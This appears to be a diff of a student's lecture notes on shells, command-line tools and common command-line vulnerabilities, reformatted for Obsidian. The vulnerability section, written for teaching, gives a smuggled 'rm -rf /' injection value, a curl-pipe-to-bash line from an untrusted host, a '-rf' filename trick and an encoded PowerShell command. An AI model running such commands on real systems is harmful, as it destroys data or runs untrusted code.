@@ -1,7 +1,7 @@
 ---
 aliases: []
 date created: Wednesday, 26. November 2025, 08:11
-date modified: Monday, 1. December 2025, 21:12
+date modified: Monday, 1. December 2025, 22:12
 ---
 
 # 2025-11-26 Command-Line Interface (Gísli)
@@ -28,7 +28,7 @@ date modified: Monday, 1. December 2025, 21:12
     - Much easier to communicate exactly to someone what they should do.
 - Different Shells (CLIs):
 - **The Unix family**.
-    - Bash: POSIX-compliant, default on most Linux
+    - Bash: [POSIX](../Terminology/Systems & Plaforms/POSIX)-compliant, default on most Linux
     - Zsh: more customizable, advanced features, default on macOS
 - **The Windows family**.
     - PowerShell: Standard for Windows administration, has things like `OO` (pipes.NET Objects instead of text)
@@ -40,12 +40,9 @@ date modified: Monday, 1. December 2025, 21:12
 
 ## Useful commands
 
-<aside>
-⚠️
+> [!warning]
+> PowerShell allows you to use many Bash command names (like `ls` or `cp`), but they are just aliases.
 
-PowerShell allows you to use many Bash command names (like `ls` or `cp`), but they are just aliases.
-
-</aside>
 
 - **The Syntax**: PowerShell uses “Verb-Noun” pairs (e.g., `Get-ChildItem`, `Copy-Item`,  `Set-Location`).
 - **The Alias**: `ls` is just an alias/nickname for `Get-ChildItem`.
@@ -71,34 +68,25 @@ PowerShell allows you to use many Bash command names (like `ls` or `cp`), but th
 
 ### Reading & Searching (TODO)
 
-| Action | Bash/Zsh | PowerShell |
-| --- | --- | --- |
-| Read content | `cat` | `cat` / `type` (`Get-Content`) |
-| Pager | `less` | `more` |
-| First $n$ lines | `head -n 10` | `select -first 10` (`Select-Object -First 10`) |
-| Last $n$ lines | `tail -n 10` | `select -last 10` (`Select-Object -Last 10`) |
-| Live Log | `tail -f` | `Get-Content -Wait` |
-| Search Text | `grep "txt"` | `sls "txt"` (`Select-String`) |
-| Find File | `find. -name "X"` | `ls -r -filter "X"` (`Get-ChildItem -Recurse -Filter`) |
-| Find File by Content | `grep -R "txt"` | `ls -r | sls "txt"` (`Get-ChildItem -Recurse | Select-String -Pattern "txt"`) |
+| Action               | Bash/Zsh          | PowerShell                                             |
+| -------------------- | ----------------- | ------------------------------------------------------ |
+| Read content         | `cat`             | `cat` / `type` (`Get-Content`)                         |
+| Pager                | `less`            | `more`                                                 |
+| First $n$ lines      | `head -n 10`      | `select -first 10` (`Select-Object -First 10`)         |
+| Last $n$ lines       | `tail -n 10`      | `select -last 10` (`Select-Object -Last 10`)           |
+| Live Log             | `tail -f`         | `Get-Content -Wait`                                    |
+| Search Text          | `grep "txt"`      | `sls "txt"` (`Select-String`)                          |
+| Find File            | `find. -name "X"` | `ls -r -filter "X"` (`Get-ChildItem -Recurse -Filter`) |
+| Find File by Content | `grep -R "txt"`   | `ls -r                                                 |
 - **SuperUser Permissions:**
-    
-    
-    - **Bash**: `sudo command`
-    
-    - **PowerShell**: Right-Click → “Run as Administrator”.
+	- **Bash**: `sudo command`
+	- **PowerShell**: Right-Click → “Run as Administrator”.
 - **Process Management:**
-    
-    
     - **Bash**: `ps`, `kill PID`
-    
     - **PowerShell**: `ps` (`Get-Process`), `kill` (`Stop-Process`)
 - **Web Requests:**
-    
-    
     - **Bash**: `curl url`
         - (Fetch the thing at this URL. Lets you download stuff at this URL.)
-    
     - **PowerShell**: `curl` (`Invoke-WebRequest`)
     - (Note: PowerShell’s ‘`curl`’ is NOT the real `curl`. It parses *HTML* objects.)
 
@@ -170,13 +158,9 @@ The Logic:
 
 ## Patterns: File Globs vs. Regular Expressions (Regex)
 
-<aside>
-⚠️
+> [!warning] The Confusion
+> Both systems use similar symbols (like `*`), but they mean different things and serve different purposes.
 
-**The Confusion**
-Both systems use similar symbols (like `*`), but they mean different things and serve different purposes.
-
-</aside>
 
 |  | **File Globs (Wildcards)** | **Regular Expressions (Regex)** |
 | --- | --- | --- |
@@ -201,24 +185,12 @@ Basic Syntax Cheatsheet:
 
 ## Text Processing: `tr`, `cut`, `sed`, `awk`
 
-| **Tool** | **Mental Model** | **Syntax & Example** |
-| --- | --- | --- |
-| `tr` | **The Char Swapper.**
-Swaps or deletes single characters. Cannot handle words. | `tr '<old>' '<new>'`
-Ex: Uppercase:
-`echo "hi" | tr 'a-z' 'A-Z'` |
-| `cut` | **The Slicer.**
-Strictly slices each line based on a specific delimiter (like a comma). | `cut -d"<delim>" -f<number>`
-Ex: Get 1st column of CSV:
-`cut -d"," -f1 data.csv` |
-| `sed` | **The Surgeon.**
-Uses Regex to find and replace patterns within the text. | `sed 's/<find>/<replace>/g'`
-Ex: Replace text:
-`sed 's/cat/dog/g' file.txt` |
-| `awk` | **The Spreadsheet.**
-Smart column extraction. Handles messy whitespace automatically. | `awk '{print $<N>}'`
-Ex: Get PID (2nd col) from `ps`:
-`ps aux | awk '{print $2}'` |
+| **Tool** | **Mental Model**                                                                             | **Syntax & Example**                                                                      |
+| -------- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
+| `tr`     | **The Char Swapper.  <br>**Swaps or deletes single characters. Cannot handle words.          | `tr '<old>' '<new>'`  <br>Ex: Uppercase:  <br>`echo "hi" \| tr 'a-z' 'A-Z'`               |
+| `cut`    | **The Slicer.  <br>**Strictly slices each line based on a specific delimiter (like a comma). | `cut -d"<delim>" -f<number>   `Ex: Get 1st column of CSV:  <br>`cut -d"," -f1 data.csv`   |
+| `sed`    | **The Surgeon.  <br>**Uses Regex to find and replace patterns within the text.               | `sed 's/<find>/<replace>/g'`  <br>Ex: Replace text:  <br>`sed 's/cat/dog/g' file.txt`     |
+| `awk`    | **The Spreadsheet.  <br>**Smart column extraction. Handles messy whitespace automatically.   | `awk '{print $<N>}'   `Ex: Get PID (2nd col) from `ps`:  <br>`ps aux \| awk '{print $2}'` |
 
 Use `cut` for simple delimiters (CSV). Use `awk` for messy output (like `ls` or `ps`) where spaces vary.
 
@@ -226,23 +198,11 @@ Use `cut` for simple delimiters (CSV). Use `awk` for messy output (like `ls` or 
 
 In PowerShell, you rarely manipulate raw text streams. You manipulate Properties and call Methods.
 
-| **Unix Tool** | **PowerShell Strategy** | **PowerShell Syntax/Example** |
-| --- | --- | --- |
-| `tr`
-(Char swap) | String Methods.
-Call .NET methods directly on the string object. | `<String>.Method()`
-Ex: `"hello".ToUpper()`
-Ex: `" hi ".Trim()` |
-| `sed`
-(Regex replace) | The `-replace` Operator.
-Uses Regex natively to swap patterns. | `$_ -replace 'regex','new'`
-Ex:
-`"cat" -replace 'c','b'`→ “bat” |
-| `cut` & `awk`
-(Columns) | `Select-Object`.
-Don’t cut delimiters; ask for the property name. | `Select-Object Name, Id`
-Ex (CSV):
-`Import-Csv data.csv | select Email` |
+| **Unix Tool**              | **PowerShell Strategy**                                                | **PowerShell Syntax/Example**                                                      |
+| -------------------------- | ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
+| `tr`<br>(Char swap)        | String Methods.  <br>Call .NET methods directly on the string object.  | `<String>.Method()`  <br>Ex: `"hello".ToUpper()`  <br>Ex: `" hi ".Trim()`          |
+| `sed`<br>(Regex replace)   | The `-replace` Operator.  <br>Uses Regex natively to swap patterns.    | `$_ -replace 'regex','new'`  <br>Ex:  <br>`"cat" -replace 'c','b'`→ “bat”          |
+| `cut` & `awk`<br>(Columns) | `Select-Object`.  <br>Don’t cut delimiters; ask for the property name. | `Select-Object Name, Id`  <br>Ex (CSV):  <br>`Import-Csv data.csv \| select Email` |
 
 ## Loops: Iterating over items
 
@@ -303,154 +263,89 @@ Usage: `Greet -Name "John"`
 
 **The Challenge**: Editing files directly on a server without a mouse.
 
-| **Editor** | **Archetype** | **Description** |
-| --- | --- | --- |
-| Nano | The Beginner | Modeless. behaves like Notepad. Instructions are listed at the bottom (e.g.,
-Ctrl+X to Exit). |
-| Vim | The Standard | Modal. You are either in “Insert Mode”
-(typing) or “Command Mode” (navigating). Extremely fast once learned. Installed on 99% of servers. |
-| Emacs
-(don’t use this 😟) | The Ecosystem | Programmable. An interpreter for Lisp.
-Extremely powerful (can run email, calendars, games), but complex key combinations. |
+| **Editor**                         | **Archetype** | **Description**                                                                                                                                                                                                                      |
+| ---------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **Nano**                           | The Beginner  | Modeless. behaves like Notepad. Instructions are listed at the bottom (e.g., Ctrl+X to Exit).                                                                                                                                        |
+| **Vim**                            | The Standard  | Modal. You are either in “Insert Mode” (typing) or “Command Mode” (navigating). Extremely fast once learned. Installed on 99% of servers.                                                                                            |
+| **Emacs**<br>(*don’t use this 😟*) | The Ecosystem | Programmable. An interpreter for Lisp.<br>Extremely “powerful” (*does “powerful” just mean “does a bunch of crap”? Linux people keep throwing that word around...*) (can run email, calendars, games), but complex key combinations. |
 
-<aside>
-<img src="https://www.notion.so/icons/info-alternate_gray.svg" alt="https://www.notion.so/icons/info-alternate_gray.svg" width="40px" />
 
-Tip:
-
-If you don’t want to learn Vim, at least remember how to close it:
-<ESCAPE> `:q!` <ENTER>
-
-</aside>
+> [!tip] Tip:
+>
+> If you don’t want to learn Vim, at least remember how to close it:
+\<ESCAPE> `:q!` \<ENTER>
 
 ## Script Files: Storing and Executing
 
-| **Shell** | **Extension** | **Header** | **Execution Requirements** |
-| --- | --- | --- | --- |
-| Bash | `myfile.sh` | `#!/bin/bash`
-(“Shebang”) | **Permission**: Must be executable (run `chmod +x file.sh`)
-**Run**: Must use `./file.sh` (Security feature). |
-| CMD
-(Legacy) | `myfile.bat
-myfile.cmd` | `@echo off`
-(optional) | **Run**: Type the filename (e.g., `myfile.bat`). |
-| PowerShell | `myfile.ps1` | *None* | **Policy**: Blocked by default. Enable with,
-e.g., `Set-ExecutionPolicy X`.
-Run: Must use `.\file.ps1` (Like Bash). |
+| **Shell**    | **Extension**             | **Header**                   | **Execution Requirements**                                                                                                  |
+| ------------ | ------------------------- | ---------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
+| Bash         | myfile.sh                 | `#!/bin/bash`<br>(“Shebang”) | Permission: Must be executable (run `chmod +x file.sh`) <br>Run: Must use `./file.sh` (Security feature).                   |
+| CMD (Legacy) | `myfile.bat` `myfile.cmd` | `@echo off`<br>(optional)    | **Run**: Type the filename (e.g., `myfile.bat`).                                                                            |
+| PowerShell   | `myfile.ps1`              | None                         | **Policy**: Blocked by default. Enable with, e.g., `Set-ExecutionPolicy X`. <br>**Run**: Must use `.\file.ps1` (Like Bash). |
 
-<aside>
-<img src="https://www.notion.so/icons/pencil_gray.svg" alt="https://www.notion.so/icons/pencil_gray.svg" width="40px" />
-
-**The Shebang (#!)**
-In Unix/Bash, the first line `#!/bin/bash` tells the OS which interpreter to use. You can change this to e.g. `#!/usr/bin/python` to write a Python script that behaves like a shell script.
-
-</aside>
+> [!note] Note: The Shebang (#!)
+> In Unix/Bash, the first line `#!/bin/bash` tells the OS which interpreter to use. You can change this to e.g. `#!/usr/bin/python` to write a Python script that behaves like a shell script.
 
 # Vulnerabilities in the Command Line
 
 ## Injection and Unsafe Execution
 
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
 
-**Shell Injection (Command Injection)**
-Occurs when user input is passed unsanitized to a system command.
-
-- **Vulnerable Code**: `rm $filename`
-- **Malicious Input**: `file.txt; rm -rf /`
-- **Result**: The shell interprets the semicolon as “end of command” and
+> [!error] Shell Injection (Command Injection)
+> Occurs when user input is passed unsanitized to a system command.
+>
+> - **Vulnerable Code**: `rm $filename`
+> - **Malicious Input**: `file.txt; rm -rf /`
+> - **Result**: The shell interprets the semicolon as “end of command” and
 executes the delete command next.
-- **Fix**: `rm "$filename"`
-</aside>
+> - **Fix**: `rm "$filename"`
 
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
-
-**The “Curl — Bash” Anti-Pattern**
-`curl http://untrusted.com/script.sh | bash`
-
-- **The Risk**: You are executing code from the internet **blindly**.
-- **The Fix**: Download the script *first*, inspect the code (read it), and
+> [!error] The “Curl — Bash” Anti-Pattern
+> `curl http://untrusted.com/script.sh | bash`
+>
+> - **The Risk**: You are executing code from the internet **blindly**.
+> - **The Fix**: Download the script *first*, inspect the code (read it), and
 then (*maybe*) execute it.
-</aside>
 
 ## Operational Security
 
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
+> [!error] History File Leaks
+> - Shells save command history to disk (e.g., `.bash_history`).
+> - **Danger**: Typing secrets in flags.
+> `mysql -pSecret123`
+> - **Result**: Password is stored in plain text on the hard drive.
+> - **Fix**: Use interactive prompts or environment variables.
 
-**History File Leaks**
-
-- Shells save command history to disk (e.g., `.bash_history`).
-- **Danger**: Typing secrets in flags.
-`mysql -pSecret123`
-- **Result**: Password is stored in plain text on the hard drive.
-- **Fix**: Use interactive prompts or environment variables.
-</aside>
-
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
-
-**Path Hijacking**
-
-- The `$PATH` variable controls where the shell looks for programs.
-- **Danger**: Adding `.` (current directory) to the start of PATH (or in the
+> [!error] Path Hijacking
+> - The `$PATH` variable controls where the shell looks for programs.
+> - **Danger**: Adding `.` (current directory) to the start of PATH (or in the
 path at all).
-- **Scenario**: The attacker places a [virus](../Terminology/Malware/Virus.md) named ‘ls’ in a shared folder. You type `ls`, and the [virus](../Terminology/Malware/Virus.md) runs instead of the real command.
-</aside>
+> - **Scenario**: The attacker places a [virus](../Terminology/Attacks/Malware/Virus.md) named ‘ls’ in a shared folder. You type `ls`, and the [virus](../Terminology/Attacks/Malware/Virus.md) runs instead of the real command.
 
 ## Permission Laziness
 
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
+> [!error] The “`chmod 777`” trap
+> - **Action**: Granting Read/Write/Execute permissions to *Everyone* to fix a “permission denied” error.
+> - **Risk**: Any user (or hacked web service) can overwrite your scripts.
+> - **Scenario**: Attacker modifies a startup script. When you reboot, their [malware](../Terminology/Malware.md) runs with your admin privileges.
 
-**The “`chmod 777`” trap**
-
-- **Action**: Granting Read/Write/Execute permissions to *Everyone* to fix
-a “permission denied” error.
-- **Risk**: Any user (or hacked web service) can overwrite your scripts.
-- **Scenario**: Attacker modifies a startup script. When you reboot, their
-[malware](../Terminology/Malware.md) runs with your admin privileges.
-</aside>
-
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
-
-**Running as Root**
-
-- **Principle of Least Privilege**: Always log in as a standard user; use
-`sudo` only when necessary.
-- **The Typo Hazard**: `rm -rf / home/foo/bar`
-(The space after the slash deletes the entire root directory).
-</aside>
+> [!error] Running as Root
+> - **Principle of Least Privilege**: Always log in as a standard user; use `sudo` only when necessary.
+> - **The Typo Hazard**: `rm -rf / home/foo/bar` (The space after the slash deletes the entire root directory).
 
 ## Tricks and Obfuscation
 
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
+> [!error] Unix: Wildcard Injection
+> **Concept**: Filenames can look like Flags.
+> 1. Attacker creates a file named `-rf`.
+> 2. Admin runs `rm *` inside that folder.
+> 3. Shell expands `*` to: `file1 file2 -rf`.
+> 4. Command becomes: `rm file1 file2 -rf`.
+> 5. Result: `rm` forces a recursive delete instead of deleting the file named “-rf”.
 
-**Unix: Wildcard Injection**
-
-**Concept**: Filenames can look like Flags.
-
-1. Attacker creates a file named `-rf`.
-2. Admin runs `rm *` inside that folder.
-3. Shell expands `*` to: `file1 file2 -rf`.
-4. Command becomes: `rm file1 file2 -rf`.
-5. Result: `rm` forces a recursive delete instead of deleting the file named
-“-rf”.
-</aside>
-
-<aside>
-<img src="https://www.notion.so/icons/bullseye_red.svg" alt="https://www.notion.so/icons/bullseye_red.svg" width="40px" />
-
-**PowerShell Obfuscation**
-
-Attackers hide malicious code in Base64-encoded strings to bypass text scanners.
-
-`PowerShell.exe -EncodedCommand ZWNobyAiaGFja2VkIg==`
-
-</aside>
+> [!error] PowerShell Obfuscation
+> Attackers hide malicious code in Base64-encoded strings to bypass text scanners.
+> `PowerShell.exe -EncodedCommand ZWNobyAiaGFja2VkIg==`
 
 # Up Next ..
 
